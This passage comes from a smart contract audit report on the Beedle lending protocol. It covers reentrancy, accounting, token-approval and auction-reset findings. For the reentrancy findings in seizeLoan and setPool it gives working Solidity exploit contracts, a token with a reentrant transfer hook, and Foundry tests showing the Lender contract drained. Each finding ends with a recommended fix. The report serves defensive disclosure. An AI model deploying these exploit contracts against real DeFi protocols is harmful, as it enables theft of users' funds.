            auctionLength: 5 minutes,
            interestRate: 0,
            outstandingLoans: 0
        });
        bytes32 poolId = lender.setPool(pool);
        attackerPoolId = poolId;
        // (2) Take a loan in his own pool
        Borrow memory b = Borrow({
            poolId: poolId,
            debt: 1,
            collateral: 1_000*10**18
        });
        Borrow[] memory borrows = new Borrow[](1);
        borrows[0] = b;        
        lender.borrow(borrows);
        // (3) Take a second loan in his own pool to increase the pool `outstandingLoans` amount
        b = Borrow({
            poolId: poolId,
            debt: 99,
            collateral: 1
        });
        borrows = new Borrow[](1);
        borrows[0] = b;        
        lender.borrow(borrows);
        // (4) Put the first loan up for auction
        uint256 loanId = 0;
        uint256[] memory loanIds = new uint256[](1);
        loanIds[0] = loanId;
        lender.startAuction(loanIds);      
    }

    function attackPart2(address _loanToken, address _collateralToken) external {
        // (4) Seize the loan
        auctionEnded = true;
        uint256[] memory loanIds = new uint256[](1);
        loanIds[0] = 0;
        lender.seizeLoan(loanIds);
        // (8) Send the funds back to the attacker
        ERC20(_loanToken).transfer(msg.sender, ERC20(_loanToken).balanceOf(address(this)));
        ERC20(_collateralToken).transfer(msg.sender, ERC20(_collateralToken).balanceOf(address(this)));
    }

    function tokensReceived(address from, address /*to*/, uint256 /*amount*/) external {
        require(msg.sender == loanToken, "not loan token");
        if (from == address(lender) && auctionEnded) {
            uint256 lenderBalance = ERC20(loanToken).balanceOf(address(lender));
            if (lenderBalance >= 1_000*10**18) {
                // (6) Re-enter the `seizeLoan` function
                uint256[] memory loanIds = new uint256[](1);
                loanIds[0] = 0;
                lender.seizeLoan(loanIds);
            }          
        }
    }

}
```
Here are the tests that can be added to `Lender.t.sol` to illustrate the steps of an attacker:
```solidity
function test_exploit() public {
    address attacker = address(0x5);
    // Setup
    vm.startPrank(lender1);
    WeirdToken weirdToken = new WeirdToken(1_000_000*10**18);
    weirdToken.transfer(address(lender), 10_000*10**18); 
    weirdToken.transfer(address(attacker), 1_000*10**18 + 1);
    loanToken.transfer(address(attacker), 100);

    assertEq(loanToken.balanceOf(address(lender)), 0);                  
    assertEq(weirdToken.balanceOf(address(lender)), 10_000*10**18);     // Lender contract has 10_000 weirdTokens
    assertEq(loanToken.balanceOf(address(attacker)), 100);              // Attacker has a few wei of loanToken
    assertEq(weirdToken.balanceOf(address(attacker)), 1_000*10**18 + 1);    // Attacker has 1_000 weirdTokens     

    // Exploit starts here
    vm.startPrank(attacker);
    Exploit6 attackContract = new Exploit6(lender, address(weirdToken));
    weirdToken.transfer(address(attackContract), 1_000*10**18 + 1);
    loanToken.transfer(address(attackContract), 100);

    attackContract.attackPart1(address(loanToken), address(weirdToken));
    vm.warp(block.timestamp + 5 minutes); // Wait 5 minutes for the end of the auction
    attackContract.attackPart2(address(loanToken), address(weirdToken));

    // Pool has been drained
    assertEq(loanToken.balanceOf(address(lender)), 0);              
    assertEq(weirdToken.balanceOf(address(lender)), 1);               // Lender contract has been drained (1 wei left)
    assertEq(loanToken.balanceOf(address(attacker)), 100);   
    assertEq(weirdToken.balanceOf(address(attacker)), 10_945*10**18); // Attacker has 11_000 weirdTokens (minus the fees)   
}
```

## Tools Used
Manual review + Foundry

## Recommendations
Follow the _Checks - Effect - Interactions_ (CEI) pattern by performing the token transfers at the end of the `seizeLoan` function AND use nonReentrant modifiers


# [H-08] - `Lender` contract can be drained by re-entrancy in `setPool`


## Summary
Tokens allowing reentrant calls on transfer can be drained from the contract.

## Vulnerability Details
Some tokens allow reentrant calls on transfer (e.g. `ERC777` tokens).
Example of token with hook on transfer:
```solidity
pragma solidity ^0.8.19;

import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract WeirdToken is ERC20 {

    constructor(uint256 amount) ERC20("WeirdToken", "WT") {
        _mint(msg.sender, amount);
    }

    // Hook on token transfer
    function _afterTokenTransfer(address from, address to, uint256 amount) internal override {
        if (to != address(0)) {
            (bool status,) = to.call(abi.encodeWithSignature("tokensReceived(address,address,uint256)", from, to, amount));
        }
    }
}
 ```
This kind of token allows a re-entrancy attack in the `setPool` function. When the new `p.poolBalance` is less than the `currentBalance`, the difference is sent to the borrower before updating the state.
```solidity
File: Lender.sol

L157:	} else if (p.poolBalance < currentBalance) {
            // if new balance < current balance then transfer the difference back to the lender
            IERC20(p.loanToken).transfer( // @audit - Critical Re-entrancy can drain contract
                p.lender,
                currentBalance - p.poolBalance
            );
        }
```
https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L159


## Impact
### POC
An attacker can use the following exploit contract to drain the `lender` contract:
```solidity
File: Exploit3.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {WeirdToken} from "./WeirdToken.sol";
import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import "../utils/Structs.sol";
import "../Lender.sol";

contract Exploit3  {
    Lender lender;
    Pool pool;

    constructor(Lender _lender) {
        lender = _lender;
    }

    function attack(address _loanToken, uint256 _poolBalance) external {
        ERC20(_loanToken).approve(address(lender), _poolBalance);
        // [1] Create a new pool
        Pool memory p = Pool({
            lender: address(this),
            loanToken: _loanToken,
            collateralToken: address(0),
            minLoanSize: 10*10**18,
            poolBalance: _poolBalance,
            maxLoanRatio: 2*10**18,
            auctionLength: 1 days,
            interestRate: 1000,
            outstandingLoans: 0
        });
        lender.setPool(p);
        // [2] Update pool with 0 poolBalance
        p.poolBalance = 0;
        pool = p;
        lender.setPool(p);
        // [3] Send the funds back to the attacker
        ERC20(_loanToken).transfer(msg.sender, ERC20(_loanToken).balanceOf(address(this)));
    }

    function tokensReceived(address from, address /*to*/, uint256 amount) external {
        Pool memory p = pool;
        require(msg.sender == p.loanToken, "not collateral token");
        if (from == address(lender)) {
            uint256 lenderBalance = ERC20(p.loanToken).balanceOf(address(lender));
            if (lenderBalance > 0) {
                // Re-enter
                if (lenderBalance < amount) {
                    p.poolBalance = amount - lenderBalance;
                }
                lender.setPool(p);
            }          
        }
    }

}
```
Here are the tests that can be added to `Lender.t.sol` to illustrate the steps of an attacker:
```solidity
function test_exploit() public {
	// Setup
	address attacker = address(0x5); 
	WeirdToken weirdToken = new WeirdToken(10_500*10**18); 
	weirdToken.transfer(address(lender), 9_500*10**18);
	weirdToken.transfer(address(attacker), 1_000*10**18);

	// Before the exploit
	assertEq(weirdToken.balanceOf(address(lender)), 9_500*10**18);      // Lender contract has 9_500 weirdToken
	assertEq(weirdToken.balanceOf(address(attacker)), 1_000*10**18);    // Attacker has 1_000 weirdToken

	// Exploit starts here
	vm.startPrank(attacker);
	Exploit3 attackContract = new Exploit3(lender);
	weirdToken.transfer(address(attackContract), 1_000*10**18);
	attackContract.attack(address(weirdToken), 1_000*10**18);

	// After the exploit
	assertEq(weirdToken.balanceOf(address(lender)), 0);                 // Lender contract has been drained
	assertEq(weirdToken.balanceOf(address(attacker)), 10_500*10**18);   // Attacker stole all the tokens
}
```

## Tools Used
Manual review + Foundry

## Recommendations
Follow the _Checks - Effect - Interactions_ (CEI) pattern by updating the pools mapping (Line 175) before transfering the funds AND use nonReentrant modifiers


# [H-09] - Lender loses money when a loan is refinanced
## Summary
The updated `debt` of a loan is removed twice from the `poolBalance` when a loan is refined by the `refinance` function.

## Vulnerability Details
In the `refinance` function the new `debt` is substracted twice from the `pools[poolId].poolBalance`. This leads to `poolBalance` being underestimated and so the lender can not withdraw their tokens anymore, funds are locked in the contract.

```solidity
File: Lender.sol

L635:	// now lets deduct our tokens from the new pool
	_updatePoolBalance(poolId, pools[poolId].poolBalance - debt);

// [...]

L697:	// update pool balance
	pools[poolId].poolBalance -= debt; // @audit - [CRITICAL] Debt is removed for the second time
```
https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L636

https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L698

## Impact
Funds can be locked in the contract after a refinancing. In addition, borrower is not able to `refinance` if they own more than the half of the pool because the second `poolBalance` update will underflow.

## Tools Used
Manual review

## Recommendations
Remove the second `poolBalance` update at line 698.


# [H-10] - `sellProfits` function does not work because of lack of approved tokens
## Summary
The `sellProfits` function cannot swap tokens as intended because the `IERC20(_profits)` tokens are not approved by the contract.

## Vulnerability Details
The `swapRouter.exactInputSingle(params)` call will always fail because the `swapRouter` did not receive allowance to spend the `_profits` tokens.

```solidity
File: Fees.sol

L26:	function sellProfits(address _profits) public {
        require(_profits != WETH, "not allowed");
        uint256 amount = IERC20(_profits).balanceOf(address(this));
        // @audit - Lack of approve token
        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter
            .ExactInputSingleParams({
                tokenIn: _profits,
                tokenOut: WETH,
                fee: 3000,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: amount,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            });

        amount = swapRouter.exactInputSingle(params);
        IERC20(WETH).transfer(staking, IERC20(WETH).balanceOf(address(this)));
    }
```
https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Fees.sol#L26

## Impact
Funds are locked in the contract and the `sellProfits` function will always revert.

## Tools Used
Manual review

## Recommendations
Add a token `approve` before calling the Uniswap `exactInputSingle` function
```solidity
IERC20(_profits).approve(address(swapRouter), amount);
```
Unit tests should also be added.


# [M-01] - Borrower can reset auction to not get liquidated
## Summary
Any ongoing auction is reset if the borrower calls the `refinance` function. Thus, a borrower can stop a refinancing auction to prevent him from being liquidated.

## Vulnerability Details
When calling the `refinance` function the `loans[loanId].auctionStartTimestamp` is reset to `type(uint256).max` which resets any ongoing auction.

```solidity
File: Lender.sol

L691:	// update loan auction start timestamp
	loans[loanId].auctionStartTimestamp = type(uint256).max; // @audit - Can reset auction
```
https://github.com/Cyfrin/2023-07-beedle/blob/658e046bda8b010a5b82d2d85e824f3823602d27/src/Lender.sol#L692

## Impact
An insolvent borrower can indefinitely maintain his position by calling the `refinance` function, with or without updating any loan parameter.

## Tools Used
Manual review

## Recommendations
`loans[loanId].auctionStartTimestamp` should only be reset if the pool `maxLoanRatio` is met.